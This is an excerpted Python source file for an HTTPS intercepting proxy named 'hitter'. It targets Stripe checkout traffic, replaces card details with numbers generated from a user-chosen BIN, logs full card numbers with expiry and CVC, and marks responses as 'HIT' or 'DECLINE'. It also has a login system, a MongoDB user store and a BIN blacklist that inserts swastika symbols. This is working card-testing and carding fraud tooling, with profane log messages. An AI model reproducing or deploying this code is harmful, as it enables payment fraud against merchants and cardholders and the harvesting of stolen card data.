...
userDatabase = MongoClient('mongodb://localhost:27017').admin.mohio
	...
	if req.path.split("://", 1)[1].startswith("api.stripe.com"):
		try:
			if b"payment_method_data[card][number]" in req_body:
				...
				req.addToLogs("yellow:yellow:TRYING CARD: "+parsedbody["payment_method_data[card][number]"].replace(" ", "")+"|"+parsedbody["payment_method_data[card][exp_month]"]+"|"+parsedbody["payment_method_data[card][exp_year]"]+"|"+parsedbody["payment_method_data[card][cvc]"])
				...
				req.addToLogs("yellow:yellow:TRYING CARD: "+parsedbody["card[number]"].replace(" ", "")+"|"+parsedbody["card[exp_month]"]+"|"+parsedbody["card[exp_year]"]+"|"+parsedbody["card[cvc]"])
				...
				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["source_data[card][number]"].replace(" ", "")):
					...
					parsedbody["source_data[card][cvc]"] = gennedCC[3]

				req.addToLogs("yellow:yellow:TRYING CARD: "+parsedbody["source_data[card][number]"].replace(" ", "")+"|"+parsedbody["source_data[card][exp_month]"]+"|"+parsedbody["source_data[card][exp_year]"]+"|"+parsedbody["source_data[card][cvc]"])
	...
	try:
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_pages/"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("red:red:FUCKING DECLINE : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("red:red:FUCKING DECLINE : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'"completed": true' in res_body:
				req.addToLogs('green:lime:MOTHER FUCKING HIT')
...
class ProxyRequestHandler(BaseHTTPRequestHandler):
	...
	def do_CONNECT(self):
		...
		if not self.isAuthorized() and self.hostname != "mohio""hitter":
			self.connect_intercept()
			return

		blacklisted_domains = ["r.stripe.com", "geoissuer.cardinalcommerce.com"]
		allowed_domains = ["api.stripe.com", "js.stripe.com", "m.stripe.com", "mohio","hitter"]
		try:
	...
	def do_REQ(self):
		try:
			...
			if not self.isAuthorized():
				...
				self.send_header("Location", "https://hitter")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
				return
			...
			if self.path == "/saveSettings" and self.isAuthorized():
				try:
					...
					if jsonData["bin"].startswith("409595") and self.getCurrentUser().get("username") not in bin_whitelist:
						settings["bin"] = "卐 BIN BLACKLISTED BY HITTER STAFF 卐"
					else:
				...
				self.send_response_only(302, "Found")
				self.send_header("Location", "https://hitter/settings")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
			if self.path == "/":
			...
			if self.path == "/login" and self.command == "POST":
				...
				try:
					...
					if not (
						...
						self.send_response_only(302, "Found")
						self.send_header("Location", "https://hitter/wrongpassword")
						self.send_header("Content-Type", "text/html; charset=UTF-8")
						self.send_header("Content-Length", "0")
						self.end_headers()
						return
